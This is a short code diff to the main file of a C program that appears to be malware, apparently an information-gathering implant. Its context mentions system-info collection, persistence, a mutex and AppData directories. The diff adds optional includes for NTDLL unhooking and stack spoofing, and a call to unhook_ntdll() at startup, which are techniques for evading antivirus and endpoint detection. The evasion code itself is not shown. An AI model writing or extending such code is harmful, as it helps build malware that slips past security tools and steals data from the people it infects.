@@ -71,6 +71,13 @@ extern int mirage_collect_system_info(char *output, size_t outlen);
 #ifdef ENABLE_MUTEX
 #include "mutex.h"
 #endif
+#ifdef ENABLE_UNHOOK_NTDLL
+#ifdef ENABLE_STACK_SPOOF
+#include "stack_spoof.h"
+#endif
+
+#include "unhook.h"
+#endif
 
 /* ── Cleanup ──────────────────────────────────────────────────── */
 #ifdef ENABLE_PERSISTENCE
@@ -481,6 +488,11 @@ int main(int argc, char *argv[]) {
     get_appdata_roaming(roaming, sizeof(roaming));
 
     dbg_printf("[+] Local:  %s\n", local);
+#ifdef ENABLE_UNHOOK_NTDLL
+    unhook_ntdll();
+    dbg_printf("[+] NTDLL unhooked\n");
+#endif
+
     dbg_printf("[+] Roaming: %s\n", roaming);
     dbg_printf("[+] Output: %s\n", output_dir);
 
